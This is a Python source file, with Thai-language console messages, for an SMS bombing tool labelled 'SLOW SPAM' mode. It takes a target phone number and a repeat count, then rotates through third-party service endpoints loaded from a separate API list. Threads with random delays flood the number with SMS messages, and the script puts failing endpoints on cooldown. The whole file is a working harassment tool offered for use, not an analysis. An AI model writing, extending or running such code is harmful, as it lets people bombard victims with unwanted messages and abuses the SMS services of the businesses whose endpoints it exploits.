# program/SMS-Slow.py
import phonenumbers
import requests
import random
import time
import threading
from API_LIST import API_CONFIG

# --- 🎨 ส่วนสี ---
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    C_GREEN = Fore.GREEN + Style.BRIGHT
    C_RED = Fore.RED + Style.BRIGHT
    C_YELLOW = Fore.YELLOW + Style.BRIGHT
    C_CYAN = Fore.CYAN + Style.BRIGHT
    C_RESET = Style.RESET_ALL
except ImportError:
    C_GREEN = C_RED = C_YELLOW = C_CYAN = C_RESET = ""
# -----------------

file_lock = threading.Lock()
api_lock = threading.Lock()
api_status = {k: {"active": True, "cooldown": 0, "notified": False} for k in API_CONFIG}

def clean_phone_number(phone):
    phone = phone.strip()
    if phone.startswith("+66"): phone = "0" + phone[3:]
    elif phone.startswith("66"): phone = "0" + phone[2:]
    phone = "".join(filter(str.isdigit, phone))
    return phone

def process_phone_with_api(phone, api_key, success_count):
    retry_delay = 300 
    current_time = time.time()

    with api_lock:
        if not api_status[api_key]["active"] and current_time >= api_status[api_key]["cooldown"]:
            api_status[api_key]["active"] = True
            api_status[api_key]["notified"] = False
        
        if not api_status[api_key]["active"]:
            return False, success_count

    cfg = API_CONFIG.get(api_key)
    if not cfg: return False, success_count

    url = cfg["url"].format(phone=phone) if "{phone}" in cfg["url"] else cfg["url"]
    headers = cfg["headers"]()
    data_input = cfg["data"](phone) if cfg["data"] else None

    start_time = time.time()
    try:
        kwargs = {"headers": headers, "timeout": 15}
        if isinstance(data_input, dict): kwargs["json"] = data_input
        elif isinstance(data_input, str): kwargs["data"] = data_input

        response = requests.request(cfg["method"], url, **kwargs)
        end_time = time.time()
        
        if response.status_code in (200, 201) and cfg["success_check"](response.text):
            # ✅ สีเขียว
            print(f"{C_GREEN}ส่ง SMS สำเร็จครั้งที่ {success_count[0] + 1} | เบอร์ {phone} | Time: {end_time - start_time:.2f}s | API: {cfg['name']}{C_RESET}")
            success_count[0] += 1
            return True, success_count
            
    except Exception:
        pass

    with api_lock:
        if not api_status[api_key]["notified"]:
            api_status[api_key]["notified"] = True
        api_status[api_key]["active"] = False
        api_status[api_key]["cooldown"] = current_time + retry_delay
    return False, success_count

def worker(phone, api_key, attempt_number, success_count):
    try:
        parsed = phonenumbers.parse(phone, "TH")
        if not (phonenumbers.is_valid_number(parsed)): return
    except: return

    process_phone_with_api(phone, api_key, success_count)

def send_sms_to_number(phone_number, num_attempts):
    cleaned_phone = clean_phone_number(phone_number)
    if not cleaned_phone or len(cleaned_phone) != 10:
        print(f"{C_RED}เบอร์ {phone_number} ไม่ถูกต้อง{C_RESET}")
        return

    print(f"{C_CYAN}🐢 เริ่มโหมด SLOW SPAM...{C_RESET}")
    api_keys = list(API_CONFIG.keys())
    threads = []
    success_count = [0]

    for i in range(num_attempts):
        api_key = api_keys[i % len(api_keys)]
        t = threading.Thread(target=worker, args=(cleaned_phone, api_key, i + 1, success_count))
        threads.append(t)
        t.start()
        time.sleep(random.uniform(0.1, 0.5))

    for t in threads: t.join()

    print(f"{C_CYAN}จบการทำงาน | ส่งสำเร็จ {success_count[0]} ครั้ง{C_RESET}")

if __name__ == "__main__":
    try:
        phone = input(f"{C_YELLOW}กรุณาใส่เบอร์โทรศัพท์: {C_RESET}")
        num = int(input(f"{C_YELLOW}จำนวนครั้ง: {C_RESET}"))
        send_sms_to_number(phone, num)
    except ValueError:
        print(f"{C_RED}ตัวเลขเท่านั้น{C_RESET}")
